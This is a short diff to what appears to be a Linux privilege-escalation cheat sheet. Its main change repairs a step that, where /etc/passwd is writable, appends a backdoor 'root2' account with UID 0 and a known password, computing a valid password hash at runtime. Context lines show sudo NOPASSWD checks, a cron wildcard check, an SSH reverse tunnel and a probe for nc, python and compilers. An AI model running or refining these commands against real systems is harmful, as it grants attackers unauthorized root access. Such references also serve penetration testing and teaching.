@@ -1050,9 +1050,10 @@ sudo -l | grep NOPASSWD
 
 # WRITABLE /ETC/PASSWD
 ls -la /etc/passwd
-# If writable:
-openssl passwd -1 -salt abc password
-echo "root2:\$1\$abc\$8R4H6h6J4ZJ2YJ2YJ2YJ2.:0:0:root:/root:/bin/bash" >> /etc/passwd
+# If writable (hash generated at runtime so it is always valid):
+openssl passwd -6 -salt abc password
+echo "root2:$(openssl passwd -6 -salt abc password):0:0:root:/root:/bin/bash" >> /etc/passwd
+# Then: su root2 / password
 
 # CRON WITH WILDCARD
 ls -la /etc/cron* | grep tar
@@ -1139,5 +1140,6 @@ ssh -R 8080:localhost:80 user@target
 which nc python python3 perl ruby php gcc g++ make
 
 # Check if GCC is installed
-command -v g
+command -v gcc
+command -v cc
 
